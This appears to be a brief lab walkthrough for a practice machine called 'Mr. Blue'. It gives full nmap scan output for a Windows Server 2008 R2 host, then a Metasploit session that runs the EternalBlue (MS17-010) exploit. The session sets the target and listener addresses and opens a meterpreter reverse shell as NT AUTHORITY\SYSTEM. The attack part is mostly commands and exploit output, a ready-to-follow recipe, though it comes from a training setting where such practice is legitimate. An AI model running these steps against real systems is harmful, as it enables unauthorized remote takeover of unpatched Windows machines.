MACHINE = MR. BLUE
TARGET = 10.150.150.242
OS = WINDOWS
DIFFICULTY = EASY

1. nmap


PORT      STATE SERVICE        REASON          VERSION
53/tcp    open  domain         syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)
80/tcp    open  http           syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   syn-ack ttl 127 Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
1433/tcp  open  ms-sql-s       syn-ack ttl 127 Microsoft SQL Server 2012 11.00.2100.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: MRBLUE
|   NetBIOS_Domain_Name: MRBLUE
|   NetBIOS_Computer_Name: MRBLUE
|   DNS_Domain_Name: MrBlue
|   DNS_Computer_Name: MrBlue
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-03-25T14:11:19
| Not valid after:  2050-03-25T14:11:19
| MD5:   6168 8dc8 79c8 5e9a 9620 6f0f de6a f664
| SHA-1: 39eb 98b3 0b8c 2ffd dba3 5509 71d5 489a d5e1 7f2b
| -----BEGIN CERTIFICATE-----
| MIIB+zCCAWSgAwIBAgIQGgKJh2erxaZPhJETldHQTzANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjAwMzI1MTQxMTE5WhgPMjA1MDAzMjUxNDExMTlaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAyzoqpiUyYjbe
| +b7XOpSgMc7/gOb/8qSfGWpyNwA81OG5O34ZSz6j8DsCM28OHBtgxbZNUJ+sJpb4
| aaB0LE9CC56KJbE0ad2xlit9lOmM+4jCoj86aEiU6ElISFYFAJbQA9wBLlg6zibn
| v5fgSXWrnc36sJ3NntyNoQK7jkdVxp8CAwEAATANBgkqhkiG9w0BAQUFAAOBgQA+
| ke3/xo0GlZBKIkXXOdHLEllUIB7hNooSYCKu8epbWok/qWSbDTZ6Oxoc5RUWtEM/
| I4Wmm0aOSEb/3NQ9vXJUt60KSr8R5GpFqVNrcdVQMutOLfXCZZ0+IrOOf3R7bo5M
| Q0CG0zih1UtSg/XCn44BMKW/BBKxNp1cghdcC3mszw==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-03-01T05:10:30+00:00; +53m22s from scanner time.
3389/tcp  open  ms-wbt-server? syn-ack ttl 127
| ssl-cert: Subject: commonName=MrBlue
| Issuer: commonName=MrBlue
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-02-28T03:03:47
| Not valid after:  2021-08-30T03:03:47
| MD5:   8129 4e62 1b78 72a2 a080 1c61 7c2a 5abe
| SHA-1: f0c5 ad2c f49f f893 67da 9335 527e 5f72 b149 a3d7
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQdEVZ2GnMcqFPhanOMPjKpjANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZNckJsdWUwHhcNMjEwMjI4MDMwMzQ3WhcNMjEwODMwMDMwMzQ3
| WjARMQ8wDQYDVQQDEwZNckJsdWUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDM5VnJ5LCe5E1aiw+EdZLA2UMWBe8MIXFe8ud+48QoZxhbPpuWcifOd6Xb
| CwmXTSgejKct/sTOkuxYH+dkIc74nLWFKwatGt7EEEkzNagvimmT9+TCHWYyL7XI
| RGy9AQZZR7Hz7OhYohZbtBD/EYe7H3TOGOABFl3C37cMEW8grxgVSKf+ntOIHijk
| GaityFJ4TkBfjtuhuvFNGQGu7ikNomvrjL9Wv487LcMfM9Q7IDKfuqJxRB/MrQvX
| IOjAH1LmsVWmAkJNvyGtYSg1REd/ZlvDm1pcCbQIGLzqVk1u6A1iN6sXYM5ASqRx
| h/HjS/isDdnZLxdYR9XZ0dxNuK7jAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEANhPKtCc3FaGFYx8j
| 6bOpn5StGkWax0wcPpYIfeOin8SqFl+2UJh9hfZrNTT6R3vSAKVUg/hhphLzA0AN
| uAZ9N9+LW62kfbE1S2MWDkZA59VGRhw4MrJBd5osU3qLTCWr4EDGylI/QfZoNPwR
| Adxe9EskB6CdY0Jp9pFaaBVQTCsSepwqMpktyBMVRwU0+U9ku0hdcM+MOXCLK++i
| qF6Vn26AFAViqrDWzfhsqHHFy5ohn/HQ/C0LBia2BJTPtkPMZAIP3c3kGiFxKt1p
| 7lHj/J113SPBq2snLVsyfd32Us6zY7rGQpcfny/eTFTPNCdJmfm8ztq1YYWpPSs4
| pfr6tQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-03-01T05:10:30+00:00; +53m22s from scanner time.
8089/tcp  open  ssl/http       syn-ack ttl 127 Splunkd httpd
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-10-25T09:53:52
| Not valid after:  2022-10-24T09:53:52
| MD5:   e91c 7851 211d 939d 7b05 79b7 f700 c3ab
| SHA-1: 42c1 a480 5895 6b96 5e7b 21b5 ac94 c815 995a ae6f
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQD+w83FEULtUTANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0xOTEwMjUwOTUzNTJaFw0yMjEwMjQwOTUz
| NTJaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqFPI
| 1+JiB6oBZ0WOMVECFKkdWJ9s7kJrqEJlC2YTBP0WcFQnzh6RlqBB2Szdcq7WwImp
| oAkfERO3+lcJZFIkq5XpcWuOzSj8RUoTxxL4DxZzvOV2ofYf7LSytvFOOnFI8epA
| JaVzvwsGtb4o0VgwN4XxFYhEvomkN98gn1aKOGKJ+4fRlYS++pdImrv6sDeO1Y/h
| MavLScws05ZXl9JzwssH/5DfZWGPwbV1y+mE4smHyf+EZDYRPDssjYN1JP7Hzflm
| r1vmPr6rC4KaW1v8wJ8Gh6sESZu6FTpsdU4O1/k3XZvpXdPXqMmn0/o/zUWxvJSY
| Mu071XycOQdCjsiuCQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQAJI9/S8mDmQID5
| YElAFZmwQ8Q9I1Ix7MiXeHpdliV9zOY6XUKQpFclJDRoUBQwnzOcoueHT9atoxe2
| GbbLXfA4Mqpb0XaVsoj5EvIZI+NpPfa8Su+XjdasSjm47Xc1eMBQ46zTLSo4/HSL
| vpU5lY6BwnMjQnneV2Bav2wAi69PDRYBqEBxoYV3qJmhK4V1MbnhthBdwc0CB1L5
| 4JEoHtRvYXJIfncaLCvvnaY45DlaRZjQlBAsTxDZ9ZNiSrdjngpLsLwHZZGH6Jzh
| qBhk87QuBbdLwe37nmQxJZJK8LgdbS6ITk5XNkRcJYeAnGNeUhqHHKE027JXibwE
| tmX7IzuM
|_-----END CERTIFICATE-----
49152/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49197/tcp open  ms-sql-s       syn-ack ttl 127 Microsoft SQL Server 2012 11.00.2100; RTM
| ms-sql-ntlm-info:
|   Target_Name: MRBLUE
|   NetBIOS_Domain_Name: MRBLUE
|   NetBIOS_Computer_Name: MRBLUE
|   DNS_Domain_Name: MrBlue
|   DNS_Computer_Name: MrBlue
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-03-25T14:11:19
| Not valid after:  2050-03-25T14:11:19
| MD5:   6168 8dc8 79c8 5e9a 9620 6f0f de6a f664
| SHA-1: 39eb 98b3 0b8c 2ffd dba3 5509 71d5 489a d5e1 7f2b
| -----BEGIN CERTIFICATE-----
| MIIB+zCCAWSgAwIBAgIQGgKJh2erxaZPhJETldHQTzANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjAwMzI1MTQxMTE5WhgPMjA1MDAzMjUxNDExMTlaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAyzoqpiUyYjbe
| +b7XOpSgMc7/gOb/8qSfGWpyNwA81OG5O34ZSz6j8DsCM28OHBtgxbZNUJ+sJpb4
| aaB0LE9CC56KJbE0ad2xlit9lOmM+4jCoj86aEiU6ElISFYFAJbQA9wBLlg6zibn
| v5fgSXWrnc36sJ3NntyNoQK7jkdVxp8CAwEAATANBgkqhkiG9w0BAQUFAAOBgQA+
| ke3/xo0GlZBKIkXXOdHLEllUIB7hNooSYCKu8epbWok/qWSbDTZ6Oxoc5RUWtEM/
| I4Wmm0aOSEb/3NQ9vXJUt60KSr8R5GpFqVNrcdVQMutOLfXCZZ0+IrOOf3R7bo5M
| Q0CG0zih1UtSg/XCn44BMKW/BBKxNp1cghdcC3mszw==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-03-01T05:10:30+00:00; +53m22s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=3/1%OT=53%CT=%CU=34837%PV=Y%DS=2%DC=T%G=N%TM=603C6AC6%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=7)
OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 8.091 days (since Sun Feb 21 03:05:32 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: MRBLUE; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 53m22s, deviation: 0s, median: 53m21s
| ms-sql-info:
|   10.150.150.242:1433:
|     Version:
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| nbstat: NetBIOS name: MRBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ab:46:29 (VMware)
| Names:
|   MRBLUE<20>           Flags: <unique><active>
|   MRBLUE<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   00 0c 29 ab 46 29 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 7646/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44736/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 33527/udp): CLEAN (Failed to receive data)
|   Check 4 (port 26701/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: MrBlue
|   NetBIOS computer name: MRBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-01T05:10:20+00:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-01T05:10:21
|_  start_date: 2020-03-25T14:11:23


2. i clearly found the version of windows to be vulnerable to eternal blue exploit
i started metasploit, selected the exploit, set options and executed the exploit and got a shell as NT AUTHORITY\SYSTEM



┌──(root💀Toyin)-[~/infosec/ptd/242/msfconsole]
└─# msfconsole -q
msf6 > search eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.30.91.205    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.150.150.242
RHOSTS => 10.150.150.242
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.66.67.46
LHOST => 10.66.67.46
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.66.67.46:4444
[*] 10.150.150.242:445 - Executing automatic check (disable AutoCheck to override)
[*] 10.150.150.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 10.150.150.242:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.150.150.242:445 - The target is vulnerable.
[*] 10.150.150.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 10.150.150.242:445    - Scanned 1 of 1 hosts (100% complete)
[*] 10.150.150.242:445 - Connecting to target for exploitation.
[+] 10.150.150.242:445 - Connection established for exploitation.
[+] 10.150.150.242:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.150.150.242:445 - CORE raw buffer dump (53 bytes)
[*] 10.150.150.242:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.150.150.242:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[*] 10.150.150.242:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[*] 10.150.150.242:445 - 0x00000030  61 63 6b 20 31                                   ack 1
[+] 10.150.150.242:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.150.150.242:445 - Trying exploit with 12 Groom Allocations.
[*] 10.150.150.242:445 - Sending all but last fragment of exploit packet
[*] 10.150.150.242:445 - Starting non-paged pool grooming
[+] 10.150.150.242:445 - Sending SMBv2 buffers
[+] 10.150.150.242:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.150.150.242:445 - Sending final SMBv2 buffers.
[*] 10.150.150.242:445 - Sending last fragment of exploit packet!
[*] 10.150.150.242:445 - Receiving response from exploit packet
[+] 10.150.150.242:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.150.150.242:445 - Sending egg to corrupted connection.
[*] 10.150.150.242:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.150.150.242
[*] Meterpreter session 1 opened (10.66.67.46:4444 -> 10.150.150.242:51211) at 2021-03-01 05:29:56 +0100
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

3. pwned
